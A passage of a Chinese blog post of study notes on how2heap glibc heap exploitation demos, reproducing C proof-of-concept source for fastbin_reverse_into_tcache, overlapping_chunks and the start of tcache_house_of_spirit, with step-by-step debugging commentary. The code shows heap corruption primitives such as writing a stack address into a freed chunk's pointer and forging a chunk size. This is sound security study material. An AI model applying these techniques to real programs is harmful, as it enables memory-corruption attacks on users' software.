中的堆块</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639053243183624/4a9892c36f985356a684c06acff8e701ddbb6027.png" alt="image-20211209203402999"></p><p>41 行，将 3a0、3c0 free 掉，进入 fastbin，因为函数指针未置零，所以再 free 一次 3a0，double free</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639053603368112/62f27c36df6539d2cae8bc08a5c24053ebd13d10.png" alt="image-20211209204003210"></p><p>49 行，再次 calloc 3 次</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639053663477035/8a0db771d5dbb3e9990a34cdfc6f241a9716030f.png" alt="image-20211209204103332"></p><p>可以发现 3a0 被 calloc 了两次</p><h2 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g fastbin_reverse_into_tcache.c -o fastbin_reverse_into_tcache</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a large unsigned value to the stack.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="keyword">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;(More than 7 times works fine too.)\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">    <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">    <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">    <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">    <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a single free is sufficient.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line">  <span class="keyword">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line">  <span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The stack address that we intend to target: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It&#x27;s current value is %p\n&quot;</span>,</span><br><span class="line">    &amp;stack_var[<span class="number">2</span>],</span><br><span class="line">    (<span class="keyword">char</span>*)stack_var[<span class="number">2</span>]</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Now we use a vulnerability such as a buffer overflow or a use-after-free\n&quot;</span></span><br><span class="line">    <span class="string">&quot;to overwrite the next pointer at address %p\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line">  *(<span class="keyword">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Empty tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The next allocation triggers the stack to be overwritten. The tcache\n&quot;</span></span><br><span class="line">    <span class="string">&quot;is empty, but the fastbin isn&#x27;t, so the next allocation comes from the\n&quot;</span></span><br><span class="line">    <span class="string">&quot;fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Those 7 chunks are copied in reverse order into the tcache, so the stack\n&quot;</span></span><br><span class="line">    <span class="string">&quot;address that we are targeting ends up being the first chunk in the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It contains a pointer to the next chunk in the list, which is why a heap\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pointer is written to the stack.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Earlier we said that the attack will also work if we free fewer than 6\n&quot;</span></span><br><span class="line">    <span class="string">&quot;extra pointers to the fastbin, but only if the value on the stack is zero.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;That&#x27;s because the value on the stack is treated as a next pointer in the\n&quot;</span></span><br><span class="line">    <span class="string">&quot;linked list and it will trigger a crash if it isn&#x27;t a valid pointer or null.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The contents of our array on the stack now look like this:\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>,</span><br><span class="line">    q</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  assert(q == (<span class="keyword">char</span> *)&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h3><p>36 行，填满 tcachebin</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639055251302798/87b02cd6b966f806ffa2866e8348cf66d4b3d36b.png" alt="image-20211209210731124"></p><p>45 行，再次 free 一个相同大小的 chunk ，tcachebin 填满了，所以会进入 fastbin </p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639055413297547/da3923794b45e6b1df5a00a217a66d373c3a1b98.png" alt="image-20211209211013123"></p><p>58 行，把剩下的 chunk 全部放入 fastbin</p><p>（？：为啥要把其他 chunk 都放进 fastbin “接下来我们需要释放 1 到 6 个更多的指针。这些也会在 fastbin 中。如果我们要覆盖的堆栈地址不为零那么我们需要再释放 6 个指针，否则攻击将导致分段错误。但如果堆栈上的值为零，则一个空闲就足够了。” 不是很理解）</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639055700167520/384960d656e7ddccdac6c4d05a2bdde8f1de7024.png" alt="image-20211209211459901"></p><p>62 行，初始化了一个数组，并用 0xcd 填满</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639056212586176/ac2c135f2a6ea3cdd188d77a2560536466b14c53.png" alt="image-20211209212332412"></p><p>80 行，把数组起始地址赋给目标 chunk (victim)</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639056351911524/7501c2cd5bf357d4b72d1b2115741181c0d365d0.png" alt="image-20211209212551751"></p><p>91 行，把 tcachebin 中的 chunk 都拿出来</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639056642208263/8affc5e25b3cd4b0ce8fda8bafb5e7cffe540925.png" alt="image-20211209213042048"></p><p>120 行，这时又单独申请出了一个 chunk ，在这之前 fastbin 中的链表为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbins：chunk_1 --&gt; chunk_2 --&gt; chunk_3 --&gt; chunk_4 --&gt; chunk_5 --&gt; chunk_6 --&gt; chunk_7 --&gt; stack_var</span><br></pre></td></tr></table></figure><p>在单独申请一个 fastbin 中的堆块后，由于 tcache 的机制，剩余未被申请的堆块会以倒序的方式重新被挂进 tcache bin 中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcachebins：stack_var --&gt; chunk_7 --&gt; chunk_6 --&gt; chunk_5 --&gt; chunk_4 --&gt; chunk_3 --&gt; chunk_2</span><br></pre></td></tr></table></figure><p>因此，原本是堆块的 stack_var，由于被写在了目标堆块的fd指针上，所以被当成一个堆块挂进 tcache bin 链表中：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639057230045104/8b6f7c20a142ababe590dae3d3595a0651ae5722.png" alt="image-20211209214029875"></p><p>可以看到 stack_var 中也被写入了相应的 fd 和 bk</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639057406988122/c936cef9f232c0d04cc1d59cb5472c3dcc4258bf.png" alt="image-20211209214326829"></p><p>131 行，这时再申请一个对应大小的 chunk，stack_var 就会被当作堆块分配出来，就可以在相应的栈地址进行操作了</p><h2 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h2><h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> A simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> *p1,*p2,*p3,*p4;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nThis is another simple chunks overlapping problem\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The previous technique is killed by patch:          https://sourceware.org/git/p=glibc.git;a=commitdiff;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;which ensures the next chunk of an unsortedbin must have prev_inuse bit unset\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;and the prev_size of it must match the unsortedbin&#x27;s size\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;This new poc uses the same primitive as the previous one. Theoretically speaking, they are the same powerful.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s start to allocate 4 chunks on the heap\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        p1 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line">        p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span> - <span class="number">8</span>);</span><br><span class="line">        p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n&quot;</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(p1, <span class="string">&#x27;1&#x27;</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">memset</span>(p2, <span class="string">&#x27;2&#x27;</span>, <span class="number">0x500</span> - <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now let&#x27;s simulate an overflow that can overwrite the size of the\nchunk freed p2.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> evil_chunk_size = <span class="number">0x581</span>;</span><br><span class="line">        <span class="keyword">int</span> evil_region_size = <span class="number">0x580</span> - <span class="number">8</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;</span>,</span><br><span class="line">                 evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* VULNERABILITY */</span></span><br><span class="line">        *(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br><span class="line">        <span class="comment">/* VULNERABILITY */</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(p2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nNow let&#x27;s allocate another chunk with a size equal to the data\n&quot;</span></span><br><span class="line">               <span class="string">&quot;size of the chunk p2 injected size\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This malloc will be served from the previously freed chunk that\n&quot;</span></span><br><span class="line">               <span class="string">&quot;is parked in the unsorted bin which size has been modified by us\n&quot;</span>);</span><br><span class="line">        p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p4+evil_region_size);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p3, (<span class="keyword">char</span> *)p3+<span class="number">0x580</span><span class="number">-8</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span></span><br><span class="line">                   <span class="string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s run through an example. Right now, we have:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nIf we memset(p4, &#x27;4&#x27;, %d), we have:\n&quot;</span>, evil_region_size);</span><br><span class="line">        <span class="built_in">memset</span>(p4, <span class="string">&#x27;4&#x27;</span>, evil_region_size);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nAnd if we then memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">        assert(<span class="built_in">strstr</span>((<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p3));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调试-2"><a href="#调试-2" class="headerlink" title="调试"></a>调试</h3><p>37 行，创建了 3 个 chunk ，并填满数据</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639120198739453/b04447dbeb27a7d251219da667a380964a5163b9.png" alt="image-20211210150958466"></p><p>47 行，把 chunk 2 的 size 改为 0x581</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639120569838043/bdd14c011007eb10954d50253625c8f5e991aa2c.png" alt="image-20211210151609597"></p><p>50 行，将 chunk 2 free 掉，因为 size 被改成了 0x581(0x500+0x80)，chunk 2 将 chunk 3 “吞并”，并和 topchunk 合并 </p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639120803311021/b95fde300e6ce54e1256c1a6e5590f4be67ea1ee.png" alt="image-20211210152003150"></p><p>57 行，再次申请一个 0x578 大小的 chunk，此时 bin 中是空的，所以直接从 topchunk 中分出一部分</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639121397156227/e5fcaace399e90ebf973f5d2796800136483fe48.png" alt="image-20211210152956922"></p><p>chunk 3 仍然存在，chunk 4 包含了 chunk3 ，因此我们可以通过 chunk 4 改到 chunk 3 的内容</p><hr><p>前提是堆溢出</p><p>和在 unsortedbin 中 伪造堆块达到 uaf 的效果很像，只是这一次是在 top chunk 中进行</p><h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h2><p>简单来说就是<strong>释放一个不属于堆段的伪造堆块，然后重新申请</strong></p><h3 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -g tcache_house_of_spirit.c -o tcache_house_of_spirit</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the house of spirit attack on tcache.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;It works in a similar way to original house of spirit but you don&#x27;t need to create fake chunk after the fake chunk that will be 